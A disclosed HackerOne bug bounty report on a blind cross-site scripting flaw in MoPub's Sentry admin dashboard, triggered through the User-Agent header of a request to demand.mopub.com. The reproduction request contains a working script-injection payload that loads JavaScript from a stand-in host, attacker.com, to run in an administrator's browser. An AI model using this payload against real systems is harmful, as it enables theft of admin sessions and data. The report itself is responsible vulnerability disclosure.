# Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)

## Report Details
- **Report ID**: 275518
- **URL**: https://hackerone.com/reports/275518
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-10-08T15:56:22.379Z
- **Disclosed**: 2018-02-17T06:15:52.724Z

## Reporter
- **Username**: harisec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Summary:** 
I've identified a Blind XSS vulnerability that fires in the `Mobpub Marketplace Admin Production | Sentry` dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain **demand.mopub.com**.

**Description:** 
I've sent the following HTTPS request to the following URL `https://demand.mopub.com/accounts/login/`

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

Please note that the value of the `User-Agent` header is set to an **Blind XSS payload** (I've used `attacker.com/js` as an example but initially it was set to an script loaded from my test domain `thx.bz`.

Some time later after this initial request I've received two hits and the script from `thx.bz` was downloaded and executed. The script is configured to extract information from the browser context for demonstration purposes.

I've extracted the content of the browser DOM (attached to this report as **DOM.html**) and other interesting information:

**Dashboard Page URL**

`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`

**User IP Address**
`█████████`

**Title**
`Marketplace Admin Production | Sentry`

**User-Agent**
`█████████`

**Cookies**
`██████
`
 
**Execution Origin**
`http://sentry-test.mopub.com`

If you open the attachment **DOM.html** in a browser and search for `thx.bz` you will see that the value of the `User-Agent` is reflected inside a `<option>` tag without proper encoding and it was possible to escape the context and inject an additional `SCRIPT` tag.

The IP address that was used to visit the dashboard is `███████` and I've verified that it belongs to Twitter.

## Steps To Reproduce:

- Send the following HTTPS request (while replacing `attacker.com/js` with a domain/URL you control and where you can inspect the web server logs).

```
GET /accounts/login/ HTTP/1.1
Referer: 1
User-Agent: '>"></title></style></textarea></script><script/src=attacker.com/js></script>
X-Forwarded-For: 1
Host: demand.mopub.com
Accept-Encoding: gzip,deflate
Accept: */*
X-OrigHost: demand.mopub.com

```

- Login into `http://sentry-test.mopub.com/` using administrative credentials and visit the vulnerable URL 
`http://sentry-test.mopub.com/exchange-marketplace/marketplace-admin-production/`.

- At this point a script should be loaded from your domain (the one you've used instead of `attacker.com/js`).

## Impact: 

An attacker can gain access and execute arbitrary JavaScript code in the context of the administrative dashboard `Mobpub Marketplace Admin Production | Sentry`.

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

I've attached the contents of browser DOM where the Blind XSS triggered (`DOM.html`), more information about the execution context `bxss-report.html` and screenshots from the the browser DOM.



## Attachments
- bxss-admin-panel-screenshot-1.png
- bxss-admin-dom-injection-point.png
- bxss-admin-panel-screenshot-2.png
- DOM.html
